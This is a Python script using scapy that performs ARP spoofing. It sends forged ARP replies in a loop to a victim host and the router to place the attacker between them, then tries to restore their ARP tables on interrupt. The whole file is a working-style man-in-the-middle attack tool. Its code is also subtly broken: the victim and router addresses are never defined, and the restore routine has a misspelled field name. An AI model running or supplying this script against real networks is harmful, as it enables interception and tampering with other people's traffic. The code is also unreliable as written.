#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broad_req = broadcast/arp_req
    live = scapy.srp(arp_broad_req, timeout=1, verbose=False)[0]
    return live[0][1].hwsrc
def arpsend(target_ip, spoof_ip):
    target_addr = get_mac(target_ip)
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_addr, psrc=spoof_ip)
    scapy.send(arp_packet, verbose=False)
def arp_restore(dest_ip, src_ip):
    dest_addr = get_mac(dest_ip)
    src_addr = get_mac(src_ip)
    arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdse=dest_addr, psrc=src_ip, hwsrc=src_addr)
    scapy.send(arp_packet, verbose=False, count=4)

packet_count = 0
try:
    while True:
        arpsend(victim_ip, router_ip)
        arpsend(router_ip, victim_ip)
        packet_count += 2
        print("\r[+] Spoofing...sent " + str(packet_count) + " packets"),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Detected CTRL + C....Restoring ARP Table, Please wait....")
    arp_restore(victim_ip, router_ip)
    arp_restore(router_ip, victim_ip)
    print("[+] ARP Spoofing Stopped.")